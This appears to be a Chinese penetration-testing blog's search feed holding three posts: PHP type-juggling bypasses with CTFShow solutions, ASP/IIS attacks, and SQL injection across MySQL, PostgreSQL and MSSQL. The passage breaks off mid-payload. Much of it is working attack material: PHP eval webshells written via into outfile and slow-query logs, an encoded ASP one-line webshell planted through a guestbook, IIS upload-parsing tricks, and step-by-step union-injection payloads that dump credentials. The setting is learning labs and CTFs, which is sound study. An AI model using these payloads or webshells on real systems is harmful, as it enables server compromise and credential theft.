<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP安全特性分析</title>
      <link href="/posts/b08d.html"/>
      <url>/posts/b08d.html</url>
      
        <content type="html"><![CDATA[<h2 id="过滤函数缺陷绕过">过滤函数缺陷绕过</h2><h3 id="与">== 与 ===</h3><ul class="lvl-0"><li class="lvl-2"><p>== 赋值，弱类型对比</p></li><li class="lvl-2"><p>=== 对比，类型也会对比</p></li></ul><p>本地示例演示：</p><p><strong>==的情况：</strong></p><p>代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpheader("Content-Type:text/html;charset=utf-8");$flag='You can get the flag!';//1、== ===缺陷绕过 == 弱类型对比 ===还会比较类型$a=1;if($a==$_GET['x']){ echo $flag;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种属于==的情况，在参数中输入+1 1.0 1a 这三种方式都可以输出flag</p><p><strong>===的情况：</strong></p><p>代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpheader("Content-Type:text/html;charset=utf-8");$flag='You can get the flag!';//1、== ===缺陷绕过 == 弱类型对比 ===还会比较类型$a='1';if($a===$_GET['y']){ echo $flag;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种情况输入参数为1能获取flag</p><h3 id="md5">md5</h3><p>md5()属于md5加密函数</p><p>因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p><p>基本的原理是这样的，但更严谨的字符串格式是，<code>0e</code> 开头，同时后面都是数字，不能包含其他字符的字符串，md5 值才会相等（<code>==</code> 的结果为 True，但 <code>===</code> 的结果为 False）</p><p>参考文章：<a href="https://www.cnblogs.com/ainsliaea/p/15126218.html">https://www.cnblogs.com/ainsliaea/p/15126218.html</a></p><p><strong>本地代码示例演示：</strong></p><p>代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpheader("Content-Type:text/html;charset=utf-8");$flag='You can get the flag!';if($_GET['name'] != $_GET['password']){    if(MD5($_GET['name']) == MD5($_GET['password'])){        echo $flag;    }else{         echo '?';    }  }?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种情况有两种方式绕过：</p><ol><li class="lvl-3"><p>echo MD5(‘QNKCDZO’);<br>echo MD5(‘240610708’);</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032256492.png" alt=""></p></li><li class="lvl-3"><p>利用数组绕过：name[]=1&amp;password[]=2</p></li></ol><h3 id="intval">intval</h3><p>intval()函数的作用是获取变量的整数</p><p><strong>本地代码示例演示：</strong></p><p>代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpheader("Content-Type:text/html;charset=utf-8");$flag='You can get the flag!';$i='666';$ii=$_GET['n'];if(intval($ii==$i,0)){ echo $flag;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数输入<mark>0x29a</mark>进行绕过</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032256273.png" alt=""></p><h3 id="strpos">strpos</h3><p>strpos()函数查找字符串在另一个字符串汇中第一次出现的位置（区分大小写）</p><p><strong>本地代码示例演示：</strong></p><p>代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpheader("Content-Type:text/html;charset=utf-8");$flag='You can get the flag!';$i='666';$ii=$_GET['h'];if(strpos($ii,$i,"0")){ echo $flag;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入参数h=%0a666进行绕过</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032257831.png" alt=""></p><h3 id="in-array">in_array</h3><p>从数组里搜索特定词注：strict 可选，如果该参数设置未TRUE，则in_array()函数检查搜索的数据组的值类型是否相同，也就是没有true，就是相当于==</p><p><strong>本地代码示例演示：</strong></p><p>代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpheader("Content-Type:text/html;charset=utf-8");$flag='You can get the flag!';$whitelist = [1,2,3];$page=$_GET['i'];if (in_array($page, $whitelist)) { echo $flag;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032257953.png" alt=""></p><h3 id="preg-match">preg_match</h3><p>执行匹配正则表达式可以利用数组绕过</p><p><strong>本地代码示例演示：</strong></p><p>代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpheader("Content-Type:text/html;charset=utf-8");$flag='You can get the flag!';if(isset($_GET['num'])){$num = $_GET['num'];if(preg_match("/[0-9]/", $num)){die("no no no!");}if(intval($num)){echo $flag;}}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用数组进行绕过</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032257750.png" alt=""></p><p>这个报错属于代码没有处理，但不要紧，理解就行</p><blockquote><p><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL</p></blockquote><h3 id="str-replace">str_replace</h3><p>过滤字符串，把字符串替换成另一个字符串存在一个问题：无法迭代循环，只能一次过滤</p><p><strong>本地代码示例演示：</strong></p><p>代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpheader("Content-Type:text/html;charset=utf-8");$sql=$_GET['s'];$sql=str_replace('select','',$sql);echo $sql;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种常用于sql注入双写绕过</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032257350.png" alt=""></p><h3 id="小结">小结</h3><ul class="lvl-0"><li class="lvl-2"><p>== 与 ===</p><ul class="lvl-2"><li class="lvl-4">不比较类型</li><li class="lvl-4">比较类型</li><li class="lvl-4">md5</li></ul></li><li class="lvl-2"><p>intval</p><p>取整数，进制或小数等绕过</p></li><li class="lvl-2"><p>strops</p><p>查看字符串，换行绕过</p></li><li class="lvl-2"><p>in_array</p><p>第三个参数设置安全</p></li><li class="lvl-2"><p>preg_match</p><ul class="lvl-2"><li class="lvl-4">数组绕过</li><li class="lvl-4">不带M正则表达，可用换行</li></ul></li><li class="lvl-2"><p>str_replace</p><p>无递归，双写绕过</p></li></ul><h2 id="实践-CTFShow-PHP-特性-89-关卡">实践-CTFShow-PHP 特性-89 关卡</h2><h3 id="web89">web89</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num'])){    $num = $_GET['num'];    if(preg_match("/[0-9]/", $num)){        die("no no no!");    }    if(intval($num)){        echo $flag;    }}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关可以利用数组绕过</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032257870.png" alt=""></p><h3 id="web90">web90</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num'])){    $num = $_GET['num'];    if($num==="4476"){        die("no no no!");    }    if(intval($num,0)===4476){        echo $flag;    }else{        echo intval($num,0);    }}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关利用进制绕过</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032257396.png" alt=""></p><h3 id="web91">web91</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpshow_source(__FILE__);include('flag.php');$a=$_GET['cmd'];if(preg_match('/^php$/im', $a)){    if(preg_match('/^php$/i', $a)){        echo 'hacker';    }    else{        echo $flag;    }}else{    echo 'nonononono';}&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>/^php$/im中的m是指换行，这一关利用换行绕过</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032257759.png" alt=""></p><h3 id="web92">web92</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num'])){    $num = $_GET['num'];    if($num==4476){        die("no no no!");    }    if(intval($num,0)==4476){        echo $flag;    }else{        echo intval($num,0);    }}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关可以利用进制绕过，输入参数num=4476.1也能绕过，两种方式都可以</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032258095.png" alt=""></p><h3 id="web93">web93</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num'])){    $num = $_GET['num'];    if($num==4476){        die("no no no!");    }    if(preg_match("/[a-z]/i", $num)){        die("no no no!");    }    if(intval($num,0)==4476){        echo $flag;    }else{        echo intval($num,0);    }}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关用上一关的方式同样能绕过</p><h3 id="web94">web94</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num'])){    $num = $_GET['num'];    if($num==="4476"){        die("no no no!");    }    if(preg_match("/[a-z]/i", $num)){        die("no no no!");    }    if(!strpos($num, "0")){        die("no no no!");    }    if(intval($num,0)===4476){        echo $flag;    }}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关用换行或者空格都可以绕过</p><p>?num=%0a010574 或 ?num=%20010574</p><p>这也可以使用参数浮点型绕过 num=4476.0</p><h3 id="web95">web95</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num'])){    $num = $_GET['num'];    if($num==4476){        die("no no no!");    }    if(preg_match("/[a-z]|\./i", $num)){        die("no no no!!");    }    if(!strpos($num, "0")){        die("no no no!!!");    }    if(intval($num,0)===4476){        echo $flag;    }}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关用换行或者空格都可以绕过</p><p>?num=%0a010574 或 ?num=%20010574</p><h3 id="web96">web96</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET['u'])){    if($_GET['u']=='flag.php'){        die("no no no");    }else{        highlight_file($_GET['u']);    }}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关可以用num=./flag.php绕过</p><blockquote><p>./flag.php指读取当前目录的flag.php</p></blockquote><h3 id="web97">web97</h3><p>题目的关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if (isset($_POST['a']) and isset($_POST['b'])) {if ($_POST['a'] != $_POST['b'])if (md5($_POST['a']) === md5($_POST['b']))echo $flag;elseprint 'Wrong.';}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关可以利用数组绕过 <code>a[]=1&amp;b[]=2</code></p><p>注意：要用post方式提交参数</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306032258814.png" alt=""></p><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASP安全分析</title>
      <link href="/posts/743c.html"/>
      <url>/posts/743c.html</url>
      
        <content type="html"><![CDATA[<h2 id="ASP是什么">ASP是什么</h2><ul class="lvl-0"><li class="lvl-2">ASP 指 Active Server Pages （动态服务器页面）</li><li class="lvl-2">ASP 是一项微软公司的技术</li><li class="lvl-2">ASP 是在 IIS 中运行的程序</li><li class="lvl-2">IIS 指 Internet Information Services （Internet 信息服务）</li><li class="lvl-2">IIS 是 Windows 2000 及 Windows 2003 的免费组件</li><li class="lvl-2">IIS 同时也是 Windows NT 4.0 的可选组件</li><li class="lvl-2">此可选组件可通过因特网下载</li><li class="lvl-2">PWS 的体积更小 - 不过拥有 IIS 的完整功能</li><li class="lvl-2">PWS 可在 Windows 95/98 的安装 CD 中找到</li></ul><h2 id="ASP-环境搭建组合">ASP 环境搭建组合</h2><p>安装：</p><p>安装IIS -&gt; 打开IIS管理器 -&gt; 右键网站 -&gt; 新建 -&gt;  网站 -&gt; 下一步 -&gt; 写描述 -&gt; 网站IP地址、IP端口、网站的主机头 -&gt; 网站的目录路径 -&gt; 把读取、运行脚本、执行（如ISAPI应用程序）这三项打勾 -&gt; 点击完成</p><p>后续配置：</p><p>右键新建网站 -&gt; 属性 -&gt; 文档 -&gt; 添加默认内容文档 -&gt; index.asp -&gt; 点击新添加的index.asp -&gt; 上移 -&gt; 主目录 -&gt; 配置 -&gt; 选项 -&gt; 启用父路径</p><p>右键网站源码目录文件夹 -&gt; 安全 -&gt; Internet 来宾账号 -&gt; 选择适当给予Internet来宾账号权限，比如读取、写入权限这些</p><h2 id="ASP-数据库-MDB-默认下载">ASP-数据库-MDB 默认下载</h2><p>windows iis access (sql server)<br>access 数据库 一般后缀名 asp asa mdb(可下载)  mdb居多<br>mdb文件它在网站目录下 可以扫描得到；默认配置思路：如果知道这个数据库的地址，尝试可以下载获取数据库文件，获取当前管理员账号密码信息</p><p>以<mark>PowerEasy2006</mark>为例演示：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306022349032.png" alt=""></p><p>访问本地链接：<a href="http://192.168.255.134/Database/PowerEasy2006.mdb">http://192.168.255.134/Database/PowerEasy2006.mdb</a> #数据库配置文件，可下载数据库mdb文件</p><h2 id="ASP-数据库-ASP-后门植入连接">ASP-数据库-ASP 后门植入连接</h2><p>这里以<mark>AspCMS</mark>为例演示</p><p>在AspCMS的网站下发现有线留言功能</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306022349278.png" alt=""></p><p>打开在线留言板，这里是有写入的留言会带入数据库，所以在这里选择写入一句话木马</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">┼攠數畣整爠煥敵瑳∨≡┩愾 一句话木马<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着访问用菜刀工具或者别的webshell连接工具连接</p><ul class="lvl-0"><li class="lvl-2"><p><a href="http://192.168.255.134:81/data/data.asp">http://192.168.255.134:81/data/data.asp</a>后门地址</p></li><li class="lvl-2"><p>密码是a</p></li></ul><p>接着可以成功连接</p><h2 id="ASP-中间件-IIS-短文件名探针-安全漏洞">ASP-中间件-IIS 短文件名探针-安全漏洞</h2><h3 id="IIS短文件漏洞简述">IIS短文件漏洞简述</h3><p>攻击者可以利用“~"字符猜解或遍历服务器中文件名，<a href="http://xn--IIS-x68dp7r1pg48kyjm70ki32b.NET">或对IIS服务器中的.NET</a> Framework进行拒绝服务攻击，就是存在文件枚举漏洞，攻击者可利用此漏洞网络服务器根目录中的文件</p><h3 id="IIS短文件漏洞分析">IIS短文件漏洞分析</h3><p>windows生成MS-DOS兼容的（短）文件名，允许基于MS-DOS或者16位windows的进程访问这些文件。在cmd下输入"dir /x"即可看到短文件的效果</p><h3 id="IIS短文件名产生的原因">IIS短文件名产生的原因</h3><ol><li class="lvl-3"><p>当后缀小于4个字符时，短文件名需要文件（夹）名前缀字符长度大于等于9位</p></li><li class="lvl-3"><p>当前缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名</p></li></ol><p>目前IIS支持段文件名猜测的HTTP方法主要包含：DEBUG、OPTTIONS、GET、POST、HEAD、TRACE六种。</p><p>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功</p><h3 id="IIS短文件漏洞利用工具推荐">IIS短文件漏洞利用工具推荐</h3><ul class="lvl-0"><li class="lvl-2"><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a></p></li><li class="lvl-2"><p><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a></p></li><li class="lvl-2"><p><a href="https://github.com/WebBreacher/tilde_enum">https://github.com/WebBreacher/tilde_enum</a></p></li></ul><h3 id="IIS短文件名漏洞复现">IIS短文件名漏洞复现</h3><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306022349535.png" alt=""></p><p>原网站目录：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306022349053.png" alt=""></p><blockquote><p>只能探针到前六位 文件夹和文件名可以帮助你探针，数据库配置或后台区别：用目录扫描工具是借助字典，而用它是利用iis短文件<br>IIS短文件漏洞局限点：</p><ol><li class="lvl-3">此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解</li><li class="lvl-3">如果文件名本身太短（无短文件名）也是无法猜解的</li><li class="lvl-3">如果文件名前6位带空格， 8.3格式的短文件名会补进，和真实文件名不匹配</li></ol></blockquote><h2 id="ASP-中间件-IIS-文件上传解析-安全漏洞">ASP-中间件-IIS 文件上传解析-安全漏洞</h2><p>test.asp是一个asp小马</p><p>利用解析漏洞：</p><ul class="lvl-0"><li class="lvl-2"><p>test.asp;.jpg</p></li><li class="lvl-2"><p>建一个目录<mark>a.asp</mark>，里面包含test.jpg（test.jpg是一个asp小马文本，只是文件后缀是jpg)</p></li></ul><p>先登录：<a href="http://192.168.255.134:82/Tcnet/Admin_Login.asp">http://192.168.255.134:82/Tcnet/Admin_Login.asp</a> #管理员后台</p><p>访问：<a href="http://192.168.255.134:82/Upload.asp">http://192.168.255.134:82/Upload.asp</a></p><p>接着下来，上传文件jpg文件（带后门），然后<mark>filepath</mark>，修改成<mark>a.asp;.<mark>这样的格式，然后它就可以拼接成</mark>a.asp;.xxx.jpg</mark>文件名，这样就可以正确解析木马文件。</p><h2 id="ASP-中间件-IIS-配置目录读写-安全配置">ASP-中间件-IIS 配置目录读写-安全配置</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">属性 主目录 写入 开启 WebDAV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306022349083.png" alt=""></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306022349004.png" alt=""></p><p><strong>利用IISPutScanner工具验证：</strong></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306022349405.png" alt=""></p><p>这接来下漏洞复现，由于环境问题，我复现不出来，如果下次可以复现出来，我就更新这篇文章。</p><p>参考文章：<a href="https://www.freebuf.com/articles/web/271930.html">https://www.freebuf.com/articles/web/271930.html</a></p><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> ASP安全 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞分析(二)</title>
      <link href="/posts/9afe.html"/>
      <url>/posts/9afe.html</url>
      
        <content type="html"><![CDATA[<p><strong>前言：</strong></p><blockquote><p>上一篇文章分析SQL注入漏洞，针对数据库类型以及高权限注入没有完全分析完，这一篇文章接着分析。</p></blockquote><p><strong>不通数据库类型权限操作区分：</strong></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Access 无高权限注入点-只能猜解，而且暴力猜解，也可以根据它数据库的特性猜解MYSQL，PostgreSQL，MSSQL 高权限注入点-可升级读写执行等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="MySQL-root高权限读写注入">MySQL-root高权限读写注入</h2><p><strong>读取文件：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>==load_file()==是读取文件函数</p></li></ul><p>读取本地文件示例：</p><p><code>select load_file('c:/1.txt');</code></p><p>从注入点测试示例，测试代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php//声明文件解析的编码格式header('Content-type:text/html;charset=utf-8');//操作数据库讲数据取出进行展示$conn=mysql_connect('localhost','root','root');mysql_select_db('beescms',$conn);$i=$_GET['id'];//GET请求接受id参数名值给变量i$sql="select * from bees_article where id='$i'";$result=mysql_query($sql,$conn); //执行sql语句while($row=mysql_fetch_array($result)){    echo '&lt;br&gt;&lt;br&gt;&lt;hr&gt;';    echo $row['id'];    echo $row['content'];}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试结果：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306012253958.png" alt=""></p><p>说明在高权限条件下可以读取文件</p><p><strong>写入文件：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>into outfile</p></li><li class="lvl-2"><p>into dumpfile</p></li></ul><p>本地写入命令：</p><p><code>select 'xxx' into outfile 'c:/test.txt';</code></p><p>从测试点注入测试：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306012253433.png" alt=""></p><p>虽然好像有个报错，我也不太清楚那是怎么回事（可能是代码的处理问题），但是可以看得在高权限条件下是可以进行文件写入，只要把要写入的内容换成后门代码便可以实现后面getshell的进一步操作</p><blockquote><p>简单后门代码：<br><code>&lt;?php eval($_POST[x]);?&gt;</code></p></blockquote><p>有了文件读取，那么接下来考虑一个问题，就是黑盒测试，怎么判断路径</p><p><strong>路径的获取：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>phpinfo.php</p><p>针对phpinfo.php文件，从开发者的角度，有可能是开发网站时测试遗留的；从安全测试人员的角度，可以通过利用写入文件权限写入，也可以通过利用网站的上传漏洞上传phpinfo文件（前提是网站有文件上传漏洞）</p></li><li class="lvl-2"><p>报错</p><p>这可以测试尝试，得网站代码如何，有代码容错处理那种会报错一个异常错误，可能包含路径</p></li><li class="lvl-2"><p>字典</p></li></ul><p><strong>写入文件阻碍：</strong></p><p>无法写入：secure_file_priv 突破 注入中需要支持 SQL 执行环境，没有就需要借助 phpmyadmin 或能够直接连上对方数据库进行绕过</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">secure_file_priv 限制文件的读写，限制操作路径，比如`secure_file_priv=c:/`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>解决方法：</strong></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">set global slow_query_log=1; //开启慢日志set global slow_query_log_file='shell 路径';select '&lt;?php eval($_GET[A])?&gt;' or SLEEP(1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="PostgreSQL-高权限读写注入">PostgreSQL-高权限读写注入</h2><p>这里用墨者的一个靶场演示，靶场链接：<a href="https://www.mozhe.cn/bug/detail/86">https://www.mozhe.cn/bug/detail/86</a></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测试字段:order by 4 #不报错order by 5 #报错and 1=2 union select null,null,null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注：这个和mysql注入有区别</p></blockquote><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测显位:and 1=2 union select 'null',null,null,null 错误and 1=2 union select null,'null',null,null 正常and 1=2 union select null,null,'null',null 正常and 1=2 union select null,null,null,'null' 错误#得出显位是第 2，3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取信息：and 1=2 UNION SELECT null,version(),null,null #获取数据库版本信息 PostgreSQL 9.5.13and 1=2 UNION SELECT null,current_user,null,null #获取当前用户 postgresand 1=2 union select null,current_database(),null,null #获取当前数据库 mozhedvcms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据库名：and 1=2 union select null,string_agg(datname,','),null,null from pg_database #s所有数据库名：template1,template0,postgres,mozhedvcms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>string_agg获取所有，相当于mysql的group_concat()函数</p></blockquote><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取表名：and 1=2 union select null,string_agg(tablename,','),null,null from pg_tables where schemaname='public' #表名：notice,reg_usersand 1=2 union select null,string_agg(relname,','),null,null from pg_stat_user_tables #表名：reg_users,notice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取列名：and 1=2 union select null,string_agg(column_name,','),null,null from information_schema.columns where table_name='reg_users' #得到列名：id,name,password,status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据：and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后得到的密码进行md5解密，后登录，注意这里有个小坑，用户名是mozhe1，不是mozhe</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：and 1=2 union select null,string_agg(usename,','),null,null FROM pg_user WHERE usesuper IS TRUE如列出当前目录：and 1=2 union select null,pg_ls_dir('./'),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>postgresql</strong>注入参考：<a href="https://www.freebuf.com/sectool/249371.html">https://www.freebuf.com/sectool/249371.html</a></p><h2 id="MSSQL-sa-高权限读写执行注入">MSSQL-sa 高权限读写执行注入</h2><p>这里用墨者的一个靶场来演示，靶场链接：<a href="https://www.mozhe.cn/bug/detail/90">https://www.mozhe.cn/bug/detail/90</a></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测列数：order by 4 #不报错order by 5 #报错，说明字段为4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测显位：and 1=2 union all select 'null',null,null,null #无显位and 1=2 union all select null,'null',null,null #有显位and 1=2 union all select null,null,‘null’,null #有显位and 1=2 union all select null,null,null,‘null’ #没显位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取信息：and 1=2 union all select null,@@version,null,null #获取版本信息db_name() 当前数据库名字user、system_user,current_user,user_name 获取当前用户名and 1=2 union all select null,@@SERVERNAME,null,null 获取服务器主机信息and 1=2 union all select null,db_name(),null,null #获取数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取表名：and 1=2  union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),null,nullunion all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取列名：and 1=2  union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,nulland 1=2  union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,nulland 1=2  union all select null,(select top 1 